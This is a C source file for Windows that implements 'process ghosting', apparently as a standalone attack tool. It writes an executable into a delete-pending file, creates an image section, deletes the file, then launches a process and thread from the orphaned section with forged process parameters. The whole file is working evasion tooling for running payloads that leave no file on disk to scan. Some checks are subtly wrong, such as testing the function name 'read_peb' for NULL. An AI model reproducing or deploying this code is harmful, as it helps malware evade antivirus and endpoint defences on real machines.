#include <io.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include <userenv.h>
#include "ghosted.h"

#pragma comment(lib, "ntdll")
#pragma comment(lib, "userenv")

// Store child process info
typedef struct _CP_INFO {
    HANDLE p_handle;
    PROCESS_BASIC_INFORMATION pb_info;
} CP_INFO, * PCP_INFO;

// Get NT Header Data
IMAGE_NT_HEADERS * get_nt_hdr(unsigned char * base_addr) {
	IMAGE_DOS_HEADER* dos_hdr = (IMAGE_DOS_HEADER*)base_addr;

	if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
		fprintf(stderr, "[!] Invalid DOS Header\n");
		return NULL;
	}
	
	LONG pe_offset = dos_hdr->e_lfanew;
	printf("> PE Offset 0x%x\n", pe_offset);

	// Check if offset is greater than header size
	if (pe_offset > 1024) {
		fprintf(stderr, "[!] PE Offset beyond bounds\n");
		return NULL;
	}

	// Get NT Header
	IMAGE_NT_HEADERS * nt_hdr = (IMAGE_NT_HEADERS *)(base_addr + pe_offset);

	if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) {
		fprintf(stderr, "[!] Invalid NT Signature!\n");
		return NULL;
	}
	return nt_hdr;
}

// Get Entrypoint Relative Virtual Address
DWORD get_ep_rva(LPVOID * base_addr) {
	IMAGE_NT_HEADERS * nt_hdr = get_nt_hdr((unsigned char *)base_addr);

	if (nt_hdr == NULL) {
		return 0;
	}

//	WORD arch = nt_hdr->FileHeader.Machine;
	
	return nt_hdr->OptionalHeader.AddressOfEntryPoint;
}

// Prepare fake_exe and put it in delete mode
HANDLE prepare_target(char * target_exe) {
	HANDLE h_tfile;
	NTSTATUS _status;
	IO_STATUS_BLOCK io_status;
	FILE_DISPOSITION_INFORMATION f_fileinfo;
	f_fileinfo.DeleteFile = TRUE;

	// Create Fake File
	h_tfile = CreateFileA(
		target_exe, 
		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (h_tfile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to create: %s(0x%x)\n", target_exe, GetLastError());
		return NULL;
	}

	printf("> Created File:\t%s\n", target_exe);

	// Setting Target File in Delete Pending State
	RtlZeroMemory(&io_status, sizeof(io_status));
	FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
	_status = NtSetInformationFile(
		h_tfile, 
		&io_status, 
		&f_fileinfo, 
		sizeof(f_fileinfo),
		f_info);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtSetInformationFile failed (0x%x)\n", _status);
		CloseHandle(h_tfile);
		return NULL;
	}

	if (!NT_SUCCESS(io_status.Status)) {
		fprintf(stderr, "[!] Failed to put file in 'Delete-Pending' State (0x%x)\n", _status);
		CloseHandle(h_tfile);
		return NULL;
	}

	printf("> Put file in 'Delete-Pending' state\n");
	return h_tfile;		// Return handle to target file
}

// Read original file
unsigned char * read_orig_exe(char * original_exe) {
	HANDLE hfile;
	DWORD ho_fsz, lo_fsz;

	// Open file for reading
	hfile = CreateFileA(
		original_exe, 
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if (hfile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Could not open %s for reading(0x%x)\n", original_exe, GetLastError());
		return NULL;
	}
	printf("> Opened Orifinal Exe for reading\n");

	// Get File Size
	lo_fsz = GetFileSize(hfile, &ho_fsz);
	if (lo_fsz == INVALID_FILE_SIZE) {
		fprintf(stderr, "[!] Failed to get file size (0x%x)\n", GetLastError());
		CloseHandle(hfile);
		return NULL;
	}

	// Allocate memory
	unsigned char* s_bytes = (unsigned char*)malloc(lo_fsz);
	if (s_bytes == NULL) {
		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
		CloseHandle(hfile);
		return NULL;
	}

	// Read File
	BOOL result = ReadFile(
		hfile,
		s_bytes,
		lo_fsz,
		&ho_fsz,
		NULL
	);

	if (!result) {
		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", original_exe, GetLastError());
		free(s_bytes);
		CloseHandle(hfile);
		return NULL;
	}
	CloseHandle(hfile);
	return s_bytes;
}

// Write to Fake file and create sections
HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
	BOOL _res;
	HANDLE hsection;
	DWORD _ho_fsz;
	NTSTATUS _status;

	// Write to open handle of the file to be deleted
	_res = WriteFile(
		hfile,
		(LPCVOID)f_bytes,
		f_size,
		&_ho_fsz,
		NULL
	);

	if (!_res) {
		fprintf(stderr, "[!] Failed to write payload (0x%x)\n", GetLastError());
		return NULL;
	}

	printf("> Wrote %d bytes to target!\n", f_size);
	
	// Create section object
	hsection = 0;
	_status = NtCreateSection(
		&hsection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY, 
		SEC_IMAGE,
		hfile
	);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtCreateSession() failed! (0x%x)\n", _status);
		return NULL;
	}

	if (hsection == INVALID_HANDLE_VALUE || hsection == NULL) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession() (0x%x)\n", _status);
		return NULL;
	}

	printf("> Created a session object!\n");
	return hsection;
}

// Create Child process, query it and return a handle 
PCP_INFO create_cp(HANDLE hsection) {
	NTSTATUS _status;
	DWORD retlen = 0;
	CP_INFO * p_info = (PCP_INFO)malloc(sizeof(CP_INFO));

	if (p_info == NULL) {
		fprintf(stderr, "[!] Malloc() failed\n");
		return NULL;
	}

	RtlZeroMemory(p_info, sizeof(CP_INFO));

	_status = NtCreateProcess(
		&(p_info->p_handle),
		PROCESS_ALL_ACCESS, 
		NULL, 
		GetCurrentProcess(), 
		TRUE, 
		hsection, 
		NULL, 
		NULL);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtCreateProcess() failed (0x%x)\n", _status);
		return NULL;
	}

	if (p_info->p_handle == NULL || p_info->p_handle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateProcess()\n");
		return NULL;
	}

	_status = NtQueryInformationProcess(
		p_info->p_handle, 
		ProcessBasicInformation, 
		&(p_info->pb_info),
		sizeof(PROCESS_BASIC_INFORMATION), 
		NULL);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtQueryInformationProcess() failed (0x%x)\n", _status);
		CloseHandle(p_info->p_handle);
		return NULL;
	}

	printf("> Process ID: %d\n", GetProcessId(p_info->p_handle));
	return p_info;
}

// Write parameters to process
LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
	PVOID buffer = proc_params;
	ULONG_PTR env_end = NULL;
	ULONG_PTR buffer_end = (ULONG_PTR)proc_params + proc_params->Length;
	SIZE_T buffer_size;
	LPVOID _alloc_addr;

	// Check for empty parameters
	if (proc_params == NULL) {
		fprintf(stderr, "[!] Empty Process Parameters\n");
		return NULL;
	}

	// Check for environment variables
	if (proc_params->Environment) {
		if ((ULONG_PTR)proc_params > (ULONG_PTR)proc_params->Environment) {
			buffer = (PVOID)proc_params->Environment;
		}

		env_end = (ULONG_PTR)proc_params->Environment + proc_params->EnvironmentSize;

		if (env_end > buffer_end) {
			buffer_end = env_end;
		}
	}

	// Calculate buffer size
	buffer_size = buffer_end - (ULONG_PTR)buffer;

    // --------------------------------------------------------------------------------------------------
	if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
			fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
			return NULL;
		}
	
		if (proc_params->Environment) {
			if (!WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)) {
				fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
				return NULL;
			}
		}
		return (LPVOID)proc_params;
	}

	// --------------------------------------------------------------------------------------------------
	if (!VirtualAllocEx(hprocess, (LPVOID)proc_params, proc_params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
		return NULL;
	}

    // --------------------------------------------------------------------------------------------------

	if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
		fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
		return NULL;
	}

    // --------------------------------------------------------------------------------------------------

	if (proc_params->Environment) {
		if (!VirtualAllocEx(hprocess, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
			return NULL;
		}
		if (!WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)) {
			fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
			return NULL;
		}
	}

	return (LPVOID)proc_params;
}

// Read process environment block
PEB * read_peb(HANDLE hprocess, PROCESS_BASIC_INFORMATION * p_info)
{
	PEB * peb = (PEB *)malloc(sizeof(PEB));
	if (peb == NULL) {
		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
		return NULL;
	}

	memset(peb, 0, sizeof(PEB));

	PPEB peb_addr = p_info->PebBaseAddress;

	// printf("> PEB address: 0x%08x\n", peb_addr);

	NTSTATUS _status = NtReadVirtualMemory(hprocess, peb_addr, peb, sizeof(PEB), NULL);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] Cannot read remote PEB - %08X\n", GetLastError());
		free(peb);
		return NULL;
	}

	return peb;
}

// Write to peb
BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION * stPBI)
{
	// Get access to the remote PEB:
	ULONGLONG ullPEBAddress = (ULONGLONG)(stPBI->PebBaseAddress);
	if (!ullPEBAddress) {
		printf("Failed - Getting remote PEB address error!");
		return FALSE;
	}

	PEB stPEBCopy = { 0 };
	ULONGLONG ullOffset = (ULONGLONG)&stPEBCopy.ProcessParameters - (ULONGLONG)&stPEBCopy;

	// Calculate offset of the parameters
	LPVOID lpIMGBase = (LPVOID)(ullPEBAddress + ullOffset);

	//Write parameters address into PEB:
	SIZE_T lpulWritten = 0;
	if (!WriteProcessMemory(hProcess, lpIMGBase, &lpParamsBase, sizeof(PVOID), &lpulWritten)) {
		printf("Failed - Cannot update Params!");
		return FALSE;
	}

	return TRUE;
}

// Set Environment Veriable
BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
	DWORD ret_len = 0;
	LPVOID env, param;
	PEB * peb_copy = NULL;
	UNICODE_STRING u_tpath = { 0 };
	UNICODE_STRING u_dll_dir = { 0 };
	UNICODE_STRING u_curr_dir = { 0 };
	wchar_t w_dir_path[MAX_PATH] = { 0 };
	UNICODE_STRING u_window_name = { 0 };
	PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;

	NTSTATUS _status;
	_status = NtQueryInformationProcess(
		p_info->p_handle, 
		ProcessBasicInformation, 
		&(p_info->pb_info), 
		sizeof(PROCESS_BASIC_INFORMATION), 
		&ret_len);

	if (!__check_nt_status(_status, "NtQueryInformationProcess()")) {
		return FALSE;
	}

	// Copy Target Paths
	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
		return FALSE;
	}
	
	// Copy Target Paths
	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
		return FALSE;
	}
	
	// Get Current Directory as Wide Chars
	if ((GetCurrentDirectoryW(MAX_PATH, w_dir_path)) == 0 ) {
		fprintf(stderr, "[!] Failed to fetch Current Directory (0x%x)\n", GetLastError());
		return FALSE;
	}
	printf("> Current Directory: %S\n", w_dir_path);

	// Copy Current Directory into UNICODE_STRING
	_status = RtlInitUnicodeString(&u_curr_dir, w_dir_path);
	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
		return FALSE;
	}

	// Copy DLL Path
	_status = RtlInitUnicodeString(&u_dll_dir, L"C:\\Windows\\System32");
	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
		return FALSE;
	}

	// Name of Window
	_status = RtlInitUnicodeString(&u_window_name, L"db_was_here");
	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
		return FALSE;
	}

	// Set Environment
	env = NULL;
	if (!CreateEnvironmentBlock(&env, NULL, TRUE)) {
		fprintf(stderr, "[!] CreateEnvironmentBlock() failed (0x%x)\n", GetLastError());
		return FALSE;
	}

	_status = RtlCreateProcessParameters(
			&proc_params, 
			(PUNICODE_STRING)&u_tpath, 
			(PUNICODE_STRING)&u_dll_dir,
			(PUNICODE_STRING)&u_curr_dir, 
			(PUNICODE_STRING)&u_tpath, 
			env, 
			(PUNICODE_STRING)&u_window_name,
			NULL, NULL, NULL);

	if (!__check_nt_status(_status, "RtlCreateProcessParameters()")) {
		return FALSE;
	}

	param = write_params(p_info->p_handle, proc_params);
	if (param == NULL) {
		return FALSE;
	}

	peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
	if (read_peb == NULL) {
		return FALSE;
	}

	if (!write_params_to_peb(param, p_info->p_handle, &(p_info->pb_info))) {
		printf("Failed - Cannot update PEB: %08X", GetLastError());
		free(peb_copy);
		return FALSE;
	}
	free(peb_copy);
	
	peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
	if (read_peb == NULL) {
		return FALSE;
	}
	free(peb_copy);

	return TRUE;
}

// Spawn a process using ghosting
int spawn_process(char* real_exe, char* fake_exe) {
	DWORD f_size;
	HANDLE hfakefile, hsection;
	LPVOID base_addr;
	PCP_INFO p_info;

	// Create fake executable and put it in delete-pending state
	hfakefile = prepare_target(fake_exe);
	if (NULL == hfakefile) {
		return -1;
	}

	// read contents from the real executable
	unsigned char * f_bytes = read_orig_exe(real_exe);
	if (real_exe == NULL) {
		CloseHandle(hfakefile);
		return -2;
	}

	f_size = (DWORD)_msize(f_bytes);
	
	// Fetch Section object
	hsection = fetch_sections(hfakefile, f_bytes, f_size);
 	
	if (hsection == NULL) {
		CloseHandle(hfakefile);
		free(f_bytes);
		return -3;
	}

	// Get Entry Point of PE image
	DWORD entry_point = get_ep_rva(f_bytes);
	free(f_bytes);

	printf("> Deleting Fake File\n");

	CloseHandle(hfakefile);
	if (entry_point == 0) {
		CloseHandle(hsection);
		return -5;
	}

	printf("> Entry Point: 0x%08x\n", entry_point);

	printf("===== Creating Child Process =====\n");
	p_info = create_cp(hsection);
	if (p_info == NULL) {
		CloseHandle(hsection);
		return -6;
	}
	CloseHandle(hsection);
	printf("==== Assigning Env and CL Arguments ====\n");

	wchar_t * w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
	if (w_fname == NULL) {
		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
		CloseHandle(p_info->p_handle);
		return -7;
	}

	RtlZeroMemory(w_fname, _msize(w_fname));

	if ((MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, fake_exe, -1, w_fname, _msize(w_fname))) == 0) {
		fprintf(stderr, "[!] MultiByteToWideChar() failed\n");
		free(w_fname);
		CloseHandle(p_info->p_handle);
		return -8;
	}
		
	if (!set_env(p_info, w_fname)) {
		fprintf(stderr, "[!] Failed to set environment variables\n");
		free(w_fname);
		CloseHandle(p_info->p_handle);	
		return -9;
	} 
	free(w_fname);
	printf("> Set Environment and Proc Args\n");
	
	PEB * _peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
	if (_peb_copy == NULL) {
		CloseHandle(p_info->p_handle);
		return -10;
	} 

	PEB peb_copy = { 0 };
	memcpy(&peb_copy, _peb_copy, sizeof(PEB));
	free(_peb_copy);
	ULONGLONG image_base = (ULONGLONG)(peb_copy.ImageBaseAddress);
	ULONGLONG proc_entry = entry_point + image_base;
	printf("==== Creating Child Process ====\n");

	HANDLE hthread = NULL;

	NTSTATUS _status = NtCreateThreadEx(
		&hthread, 
		THREAD_ALL_ACCESS, 
		NULL, 
		p_info->p_handle, 
		(LPTHREAD_START_ROUTINE)(proc_entry), 
		NULL, 
		FALSE, NULL, NULL, NULL, NULL);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtCreateThreadEx() failed(0x%x)\n", _status);
		return -11;
	}

	printf("> Success - Threat ID %d\r\n", GetThreadId(hthread));

	WaitForSingleObject( p_info->p_handle, INFINITE);

	CloseHandle(p_info->p_handle);
	return 0;
}

int main(int argc, char** argv) {
	
	if (argc != 3) {
		fprintf(stderr, "[!] Invalid Usage\n");
		fprintf(stderr, "[i] Usage: %s <REAL EXE> <FAKE EXE>\n", argv[0]);
		return -1;
	}

	printf("==== Ghost Prcesses, Not People ====\n");

	char real_exe[MAX_PATH] = { 0 };
	char fake_exe[MAX_PATH] = { 0 };

	strcpy_s(real_exe, MAX_PATH, argv[1]);
	strcpy_s(fake_exe, MAX_PATH, argv[2]);

	// Check if real_exe exists with READ permissions
	if (_access_s(real_exe, 4) != 0) {
		fprintf(stderr, "[!] Failed to access:\t%s\n", real_exe);
		return -2;
	}

	// Check fake_exe does not exist
	if (_access_s(fake_exe, 0) == 0) {
		fprintf(stderr, "[!] File already present:\t%s\n", fake_exe);
		return -3;
	}

	int result = spawn_process(real_exe, fake_exe);

	return result;
}
